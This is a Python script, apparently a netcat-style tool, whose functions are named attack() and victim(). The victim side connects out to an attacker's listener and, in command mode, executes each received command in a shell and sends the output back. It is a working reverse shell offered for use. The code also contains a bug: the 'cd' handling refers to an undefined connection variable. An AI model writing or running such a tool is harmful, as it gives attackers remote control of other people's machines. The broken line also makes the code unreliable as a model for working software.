import os, sys, subprocess, os, re, socket
from threading import Thread
from getopt import getopt

HOST = ''
PORT = 0
COMMAND = False
LISTEN = False
MODE= "Message"





def help():
	print("-h : help")
	print("-p : port (10-4096)")
	print("-l : listen mode")
	print("-c : command mode")
	print("-t : target ip address")
	return

def attack():
	global HOST, PORT, LISTEN, COMMAND

	s = socket.socket()
	s.bind((HOST, PORT))
	s.listen(5)

	print(f"ready to connect({MODE})")

	con, addr = s.accept()
	print(f"connection has been established {addr[0]}:{addr[1]}")

	receive = Thread(target=receiveMessage, args=(con,))
	send = Thread(target=sendMessage, args=(con,))

	receive.start()
	send.start()

	receive.join()
	send.join()

	s.close()
	con.close()

def victim():
	global HOST, PORT, LISTEN, COMMAND

	s = socket.socket()
	s.connect((HOST, PORT))
	print("connected to server")

	if COMMAND:
		s.send(f"{os.getcwd()}>".encode())

		while True:
			try:
				command = s.recv(4096).decode()
			except:
				break

			if command == 'exit':
				s.close()
				sys.exit()
				break

			if command[:2] == "cd":
				try:
					os.chdir(command[3:])
				except:
					con.send("cannot find path.".encode())

				con.send(f"\n{os.getcwd()}>".encode())
				continue

			process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
			output, error = process.communicate()

			if output == b'':
				s.send(error+f"\n{os.getcwd()}>".encode())
			else:
				s.send(output.strip()+f"\n\n{os.getcwd()}>".encode())
				
	else:
		receive = Thread(target=receiveMessage, args=(s,))
		send = Thread(target=sendMessage, args=(s,))

		receive.start()
		send.start()

		receive.join()
		send.join()

		s.close()

	s.close()

def receiveMessage(s):
	global LISTEN,COMMAND

	while True:
		try:
			message = s.recv(4096).decode()
		except Exception as error:
			print(error)
			break

		if message == 'exit' and LISTEN==False:
			s.close()
			sys.exit()
			break
		
		if COMMAND:
			print(message, end = '')
		else:
			print(message)

def sendMessage(s):
	while True:
		message = input()
		if message == 'exit':
			s.close()
			sys.exit()
			break

		try:
			s.send(message.encode())
		except Exception as error:
			print(error)
			break


def main():
	global HOST, PORT, LISTEN, COMMAND, MODE, SILENT

	try:
		options = sys.argv[1:]
		args, _ = getopt(options, 'p:lct:h', ['port=', 'listen', 'command=', 'target=', 'help'])

	except:
		print("Invalid Options please use -h or --help to see Help")
		help()
		return

	for k, v in args:
		if k == '-p' or k == '--port':
			PORT = v
		elif k == '-l' or k == '--listen':
			LISTEN = True
		elif k == '-c' or k == '--command':
			COMMAND = True
			MODE = "Command"
		elif k == '-t' or k == '--target':
			HOST = v
		elif k == '-h' or k == '--help':
			help()
	
	PORT = int(PORT)
	if LISTEN:
		attack()
	else:
		victim()

if __name__ == '__main__':
	main()